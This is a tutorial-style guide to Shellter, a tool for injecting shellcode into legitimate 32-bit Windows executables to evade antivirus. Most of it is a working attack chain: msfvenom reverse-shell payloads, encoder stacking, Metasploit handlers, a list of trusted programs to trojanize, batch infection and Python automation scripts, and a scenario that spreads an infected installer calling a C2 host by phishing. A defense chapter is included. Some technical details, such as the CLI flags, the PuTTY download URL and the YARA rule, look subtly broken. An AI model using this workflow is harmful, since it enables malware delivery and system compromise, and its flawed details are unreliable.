---
tool_name: "shellter"
display_name: "Shellter"
mitre_tactic: "defense_evasion"
mitre_tactic_id: "TA0005"
mitre_subcategory: "av_evasion"
install_command: "sudo apt install shellter"
version: "7.2"
github_repo: "https://www.shellterproject.com/"
kali_tools_page: "https://www.kali.org/tools/shellter/"
difficulty_level: "intermediate"
requires_root: true
gui_available: false
tags: ["shellcode", "pe-infection", "injection", "av-evasion", "windows", "metasploit"]
related_tools: ["msfvenom", "veil", "scite"]
---

# Shellter

## Chapter 1: Introduction & Overview

### What is Shellter?

Shellter is a dynamic shellcode injection tool and dynamic PE (Portable Executable) infector. It injects shellcode into native Windows 32-bit applications by hijacking the execution flow of legitimate PE files. The injected binary retains its original functionality while executing the attacker's payload when triggered.

### History & Background

- **Created:** 2011 by NinjaPants
- **Maintained:** Shellter Project (shellterproject.com)
- **License:** BSD License
- **Purpose:** Dynamic AV evasion via PE infection

Shellter pioneered the concept of dynamic PE infection for AV evasion. Unlike static shellcode generators that produce standalone malicious binaries, Shellter modifies existing legitimate executables to carry malicious payloads. This approach exploits the trust relationship between users and known-good applications.

### When to Use This Tool

- **AV evasion:** Bypass signature-based antivirus detection
- **Payload delivery:** Embed payloads in legitimate-looking executables
- **Social engineering:** Deliver trojanized applications
- **Red team operations:** Generate evasive payloads for engagements

### Key Concepts

- **PE Infection:** Modifying a Portable Executable to execute injected shellcode
- **Code Caving:** Finding unused code spaces within a PE for shellcode placement
- **Original Execution Flow:** Preserving the host program's normal behavior
- **32-bit Architecture:** Shellter currently targets x86 Windows executables only

### How Shellter Differs from Other AV Evasion Tools

| Feature | Shellter | Veil | msfvenom |
|---------|----------|------|----------|
| Method | PE infection | Payload generation | Payload generation |
| Output | Modified legitimate EXE | Standalone malicious EXE | Standalone malicious EXE |
| Detection Rate | Very low (uses legitimate host) | Low-medium | High |
| Host Program | Required (32-bit Windows EXE) | Not needed | Not needed |
| Interactivity | Interactive (menu-driven) | CLI/Interactive | CLI |
| Arch Support | 32-bit only | 32/64-bit | Multiple |

---

## Chapter 2: Installation & Setup

### System Requirements

- **OS:** Kali Linux (or Linux with Wine)
- **RAM:** 1 GB minimum
- **Disk Space:** ~20 MB
- **Privileges:** Root (for Wine configuration)
- **Wine:** Required (Shellter runs via Wine)

### Installation Methods

#### Method 1: APT (Recommended)

```bash
sudo apt update && sudo apt install shellter
```

**Explanation:** Installs Shellter from Kali's official repositories along with Wine dependencies.

#### Method 2: Direct Download

```bash
# Download from shellterproject.com
wget https://www.shellterproject.com/Downloads/Shellter/Shellter-7.2.zip
unzip Shellter-7.2.zip -d /opt/shellter
```

**Explanation:** Manual download for environments without apt access or for specific version requirements.

### Post-Installation Setup

#### Enable 32-bit Architecture

```bash
sudo dpkg --add-architecture i386
sudo apt update
sudo apt install wine32
```

**Explanation:** Shellter requires 32-bit Wine to run. This enables i386 architecture support and installs wine32.

#### Verify Installation

```bash
shellter
```

**Explanation:** Launches Shellter. On first run, it will prompt for configuration if not already set up.

### Directory Structure

```
Shellter/
├── Shellter.exe          # Main executable
├── payload.txt           # Custom shellcode file (user-created)
└── Host/                 # Directory for target PE files
```

---

## Chapter 3: Basic Usage

### Interactive Mode

Shellter operates primarily through an interactive menu system. Launching `shellter` presents a menu-driven interface.

#### Launch Shellter

```bash
shellter
```

**Explanation:** Opens the interactive Shellter menu. All operations are performed through this interface.

### Mode Selection

When launched, Shellter prompts for the operation mode:

- **L - Stealth Mode:** Embeds shellcode into a legitimate PE while preserving its original behavior
- **P - Payload Mode:** Generates standalone payloads (less common use case)

### Step-by-Step: Embedding Shellcode in a PE

#### Step 1: Select Mode

```
Choose operation mode:
L - Stealth Mode
P - Payload Mode
> L
```

#### Step 2: Provide Target PE

```
Target PE full path: /path/to/legitimate.exe
```

**Explanation:** Shellter requires a 32-bit Windows PE as the host. Use legitimate executables like `putty.exe`, `notepad.exe`, or any signed 32-bit application.

#### Step 3: Choose Payload Source

```
Payload options:
1 - Use Shellter's built-in payloads
2 - Use your own payload (file)
3 - Use msfvenom output
> 3
```

#### Step 4: Generate Shellcode with msfvenom

Before Shellter prompts, generate the shellcode:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw > /tmp/payload.bin
```

**Explanation:** Generates raw shellcode for a reverse TCP meterpreter payload. The shellcode connects back to the attacker's IP on the specified port.

#### Step 5: Provide Shellcode to Shellter

```
Payload file: /tmp/payload.bin
```

#### Step 6: Select Injection Method

Shellter automatically identifies code caves in the target PE and injects the shellcode.

#### Step 7: Verify

The output file is saved alongside the original or as specified. The infected PE behaves normally until the shellcode is triggered.

### Using Built-in Payloads

```
Choose operation mode:
L - Stealth Mode
> L
Target PE: /path/to/host.exe
Payload options:
1 - Use Shellter's built-in payloads
> 1
Select payload:
1 - Bind shell
2 - Reverse shell
> 2
LHOST: 192.168.1.100
LPORT: 4444
```

**Explanation:** Shellter includes simple built-in payloads for common scenarios without requiring msfvenom.

### Command-Line Mode

```bash
shellter -s /path/to/target.exe -p /path/to/payload.bin
```

**Explanation:** Non-interactive mode for scripted or automated PE infection. The `-s` flag specifies the target PE and `-p` specifies the payload.

### Essential Flags

| Flag | Description | Example |
|------|-------------|---------|
| `-s` | Target PE path | `shellter -s /tmp/host.exe` |
| `-p` | Payload file path | `shellter -p /tmp/shellcode.bin` |
| `-f` | Force overwrite of output | `shellter -s host.exe -p payload.bin -f` |
| `-h` | Display help | `shellter -h` |

---

## Chapter 4: Intermediate Usage

### Payload Generation Strategies

#### Reverse TCP Shell

```bash
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 \
  LPORT=4444 \
  -f raw \
  -o /tmp/reverse_tcp.bin
```

**Explanation:** Standard reverse shell payload. Suitable for initial access when the target can reach the attacker's network.

#### Reverse HTTPS Shell

```bash
msfvenom -p windows/meterpreter/reverse_https \
  LHOST=192.168.1.100 \
  LPORT=443 \
  -f raw \
  -o /tmp/reverse_https.bin
```

**Explanation:** HTTPS-wrapped reverse shell. Evades basic network inspection by encrypting C2 traffic over port 443.

#### Meterpreter with Encoders

```bash
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 \
  LPORT=4444 \
  -e x86/shikata_ga_nai \
  -i 5 \
  -f raw \
  -o /tmp/encoded_payload.bin
```

**Explanation:** Applies multiple rounds of Shikata Ga Nai encoding before providing raw shellcode to Shellter. The combination of encoding + PE infection provides double-layer evasion.

### Choosing the Right Host PE

#### Criteria for Selecting Host Executables

- **Signed binaries:** Use executables with valid digital signatures to inherit trust
- **32-bit only:** Shellter requires 32-bit PE files
- **Familiar applications:** Use executables that would not arouse suspicion
- **Sufficient size:** Larger binaries provide more code caves for injection

#### Recommended Host Executables

| Application | Why |
|-------------|-----|
| PuTTY | Widely trusted, small, commonly transferred |
| WinSCP | Known utility, file transfer context is normal |
| Notepad++ | Common developer tool, trusted by security software |
| 7-Zip installer | Legitimate installer, large code base |
| Chrome/Firefox (old versions) | Highly trusted, complex binary |

### Working with Metasploit

#### Start the Handler

```bash
msfconsole -q -x "
use exploit/multi/handler;
set payload windows/meterpreter/reverse_tcp;
set LHOST 192.168.1.100;
set LPORT 4444;
exploit
"
```

**Explanation:** Sets up a listener to receive the reverse connection from the infected PE when executed on the target.

#### Full Workflow Example

```bash
# Step 1: Generate shellcode
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 LPORT=4444 -f raw > /tmp/payload.bin

# Step 2: Launch Shellter and infect PE
shellter
# Select L (Stealth), provide target PE, provide payload.bin

# Step 3: Start handler
msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST 192.168.1.100; set LPORT 4444; exploit"

# Step 4: Deliver infected PE and wait for connection
```

**Explanation:** Complete attack chain from payload generation to handler setup.

### Anti-Detection Techniques

#### Using Multiple Encoders

```bash
msfvenom -p windows/shell_reverse_tcp \
  LHOST=192.168.1.100 LPORT=4444 \
  -e x86/shikata_ga_nai \
  -i 10 \
  -f raw \
  -o /tmp/multi_encoded.bin
```

**Explanation:** 10 iterations of encoding reduces static signature detection. Combined with Shellter's PE injection, this creates a highly evasive payload.

#### Custom Payload from C

```c
// Generate shellcode from C source using sgn or similar
// Then provide raw bytes to Shellter
```

**Explanation:** Custom shellcode avoids common msfvenom signatures entirely.

---

## Chapter 5: Advanced Usage

### Advanced Injection Techniques

#### Understanding Code Caves

Shellter identifies unused space (code caves) within the PE's code section. These are areas where the original developer left padding or alignment bytes. Shellter:

1. **Scans the PE** for suitable code caves
2. **Modifies the execution flow** to jump to the cave
3. **Places shellcode** in the cave
4. **Returns execution** to the original program flow

#### Manual PE Analysis

Before injection, analyze the target PE:

```bash
# Using pefile (Python)
python3 -c "
import pefile
pe = pefile.PE('/path/to/target.exe')
for section in pe.sections:
    print(f'{section.Name}: VirtualSize={section.SizeOfRawData}, Entropy={section.get_entropy():.2f}')
"
```

**Explanation:** Higher entropy indicates packed/encrypted sections. Lower entropy sections are better candidates for code caves.

### Automation with Scripts

#### Batch PE Infection Script

```bash
#!/bin/bash
# batch_shellter.sh

TARGET_DIR="/path/to/targets"
PAYLOAD="/tmp/payload.bin"
OUTPUT_DIR="/tmp/infected"

mkdir -p "$OUTPUT_DIR"

for pe in "$TARGET_DIR"/*.exe; do
    echo "[*] Processing: $(basename $pe)"
    cp "$pe" "$OUTPUT_DIR/"
    echo "S" | shellter -s "$OUTPUT_DIR/$(basename $pe)" -p "$PAYLOAD" -f
done

echo "[+] Batch infection complete"
```

**Explanation:** Automates Shellter for infecting multiple PE files. The `-f` flag forces overwrite without prompting.

#### Python Integration

```python
#!/usr/bin/env python3
import subprocess
import os

def generate_shellcode(lhost, lport, output_file):
    cmd = [
        "msfvenom", "-p", "windows/meterpreter/reverse_tcp",
        f"LHOST={lhost}", f"LPORT={lport}",
        "-f", "raw", "-o", output_file
    ]
    subprocess.run(cmd, check=True)
    print(f"[+] Shellcode generated: {output_file}")

def infect_pe(target_pe, payload_file, output_pe):
    os.system(f"echo 'S' | shellter -s {target_pe} -p {payload_file} -o {output_pe}")
    print(f"[+] PE infected: {output_pe}")

# Usage
generate_shellcode("192.168.1.100", "4444", "/tmp/payload.bin")
infect_pe("/tmp/putty.exe", "/tmp/payload.bin", "/tmp/putty_infected.exe")
```

**Explanation:** Python wrapper for automating the Shellter workflow in larger attack frameworks.

### Integration with Red Team Frameworks

#### With Covenant

```bash
# Generate grunter (Covenant stager) as raw shellcode
# Provide to Shellter for PE infection
shellter -s /path/to/legitimate.exe -p /tmp/grunt_stager.bin
```

**Explanation:** Shellter can inject Covenant stagers into legitimate PEs for advanced C2 operations.

#### With Cobalt Strike

```bash
# Generate shellcode from Cobalt Strike
# Provide raw shellcode to Shellter
shellter
# Select Stealth mode, provide host PE, provide raw shellcode
```

**Explanation:** Cobalt Strike payloads can be embedded via Shellter for evasive delivery.

### Obfuscation Strategies

#### Payload Size Considerations

```bash
# Smaller payloads have better evasion
msfvenom -p windows/shell_reverse_tcp \
  LHOST=192.168.1.100 LPORT=4444 \
  -f raw \
  -o /tmp/small_payload.bin
```

**Explanation:** Smaller shellcode has less space requirements, more code cave options, and lower detection probability.

#### PE Section Manipulation

```bash
# Use pecheck to analyze PE before infection
pecheck /path/to/target.exe
```

**Explanation:** Understanding the PE structure helps select optimal targets and verify post-infection integrity.

---

## Chapter 6: Real-World Scenarios

### Scenario 1: CTF Challenge

**Objective:** Deliver a reverse shell while bypassing AV

**Steps:**

```bash
# 1. Generate shellcode
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=10.10.14.5 LPORT=4444 -f raw > /tmp/shell.bin

# 2. Get a legitimate 32-bit PE
wget -O /tmp/putty.exe https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html

# 3. Infect the PE with Shellter
shellter
# L -> /tmp/putty.exe -> /tmp/shell.bin

# 4. Start handler
msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST 10.10.14.5; set LPORT 4444; exploit"

# 5. Deliver and execute on target
```

**Explanation:** Complete workflow for CTF scenarios requiring AV-evasive payload delivery.

### Scenario 2: Penetration Test

**Objective:** Test organization's AV effectiveness

**Steps:**

```bash
# 1. Generate multiple payloads with different encoders
for encoder in x86/shikata_ga_nai x86/fnstenv_mov; do
  msfvenom -p windows/meterpreter/reverse_tcp \
    LHOST=192.168.1.100 LPORT=4444 \
    -e $encoder -i 5 -f raw \
    -o "/tmp/payload_${encoder}.bin"
done

# 2. Test with different host PEs
for host in putty.exe winscp.exe; do
  shellter
  # Infect each host with each payload variant
done

# 3. Deploy and report detection rates
```

**Explanation:** Tests AV detection across multiple payload/encoding combinations and host executables.

### Scenario 3: Red Team Operation

**Objective:** Covert payload delivery via trojanized application

**Steps:**

```bash
# 1. Clone a legitimate application's installer
# 2. Analyze for code caves
pecheck /path/to/legitimate_installer.exe

# 3. Generate minimal payload
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=c2.example.com LPORT=443 \
  -f raw \
  -o /tmp/minimal.bin

# 4. Infect the installer
shellter -s /path/to/legitimate_installer.exe -p /tmp/minimal.bin -f

# 5. Distribute via phishing or network share
```

**Explanation:** Real-world red team delivery using trojanized installers with minimal, evasive payloads.

### Scenario 4: Custom Shellcode Integration

**Objective:** Use shellcode from a custom C program

**Steps:**

```bash
# 1. Write shellcode-generating C code
# 2. Compile and extract shellcode
# 3. Save as raw binary
# 4. Provide to Shellter
shellter
# Stealth mode -> target PE -> custom_shellcode.bin
```

**Explanation:** Custom shellcode avoids all msfvenom signatures for maximum evasion.

---

## Chapter 7: Detection & Defense

### How Defenders Detect Shellter

#### Static Analysis Indicators

- **Code cave usage:** Unusual execution flow jumping to non-standard code locations
- **PE anomalies:** Modified entry points or section permissions
- **String analysis:** Suspicious strings in unexpected PE sections

#### Behavioral Indicators

- **Network connections:** Unexpected outbound connections from trusted applications
- **Process injection:** Parent-child process anomalies
- **Memory analysis:** Writable+Executable memory regions

#### Signature-Based Detection

```
# YARA rules for Shellter detection
rule shellter_infected {
    strings:
        $s1 = "Shellter" ascii
        $s2 = {E8 00 00 00 00}  // Common call pattern
    condition:
        any of them
}
```

**Explanation:** YARA rules can detect Shellter-infected binaries through string and pattern matching.

### Mitigation Strategies

#### Preventive Controls

1. **Application whitelisting:** Only allow approved executables to run
2. **EDR solutions:** Monitor for code injection and memory anomalies
3. **Digital signature verification:** Validate publisher certificates before execution
4. **Network segmentation:** Limit outbound connections from endpoints

#### Detective Controls

1. **Behavioral monitoring:** Detect process injection and memory manipulation
2. **Network traffic analysis:** Identify C2 communication patterns
3. **File integrity monitoring:** Detect modifications to trusted executables
4. **Endpoint telemetry:** Monitor for suspicious API calls (VirtualAlloc, WriteProcessMemory)

### Blue Team Response

1. **Deploy application control** using WDAC or AppLocker
2. **Enable memory integrity** (HVCI) to prevent code injection
3. **Monitor for unsigned DLLs** loaded by signed executables
4. **Analyze network flows** for connections to known C2 infrastructure
5. **Implement egress filtering** to restrict outbound connections

---

## Chapter 8: Troubleshooting

### Common Errors

#### Error: "Application could not be started"

**Cause:** Wine not properly configured or wine32 not installed

**Solution:**

```bash
sudo dpkg --add-architecture i386
sudo apt update
sudo apt install wine32
sudo dpkg-reconfigure wine
```

**Explanation:** Shellter requires 32-bit Wine support. This error occurs when wine32 is missing.

#### Error: "No suitable code cave found"

**Cause:** Target PE is too small or already packed/encrypted

**Solution:**

```bash
# Use a larger, uncompressed 32-bit PE
# Avoid packed executables
# Try a different host binary
```

**Explanation:** Shellter needs available space within the PE's code section. Packed or compressed binaries have fewer code caves.

#### Error: "Invalid PE format"

**Cause:** Target file is not a valid 32-bit Windows PE

**Solution:**

```bash
# Verify PE architecture
file /path/to/target.exe
# Should show: PE32 executable (console) Intel 80386

# Use 64-bit to 32-bit conversion if needed
```

**Explanation:** Shellter only works with 32-bit (PE32) executables, not 64-bit (PE32+).

### Performance Optimization

```bash
# Use SSD for faster I/O
# Close unnecessary applications during infection
# Use smaller PEs for faster processing
```

### FAQ

**Q: Can Shellter infect 64-bit executables?**
A: Not currently. Shellter only supports 32-bit (x86) PE files.

**Q: Does the infected PE still work normally?**
A: Yes. The original functionality is preserved. The shellcode executes transparently.

**Q: What antivirus engines does Shellter bypass?**
A: Shellter bypasses most signature-based AV engines. However, behavioral/EDR solutions may detect the injected code at runtime.

**Q: Can I use Shellter on Linux?**
A: Shellter runs via Wine on Linux. Install wine32 first.

**Q: How do I test detection rates?**
A: Upload the infected PE to VirusTotal and check detection ratio across engines.

---

## Resources

### Official Documentation

- [Shellter Project](https://www.shellterproject.com/)
- [Shellter GitHub](https://github.com/paradoxic-Zero/Shellter)
- [Kali Linux Shellter](https://www.kali.org/tools/shellter/)

### Tutorials

- [Shellter Usage Guide - HackTricks](https://book.hacktricks.xyz/)
- [AV Evasion with Shellter - OffSec PEN-200](https://www.offsec.com/courses/pen-200/)
- [PE Infection Deep Dive - Core Security Blog](https://www.coresecurity.com/blog)

### Related Tools

- **msfvenom:** Payload generator for Shellter input
- **Veil:** Alternative AV evasion framework
- **sgn:** Shikata Ga Nai encoder
- **pecheck:** PE analysis utility

### Practice Resources

- [HackTheBox](https://www.hackthebox.com/)
- [TryHackMe](https://tryhackme.com/)
- [VulnHub](https://www.vulnhub.com/)
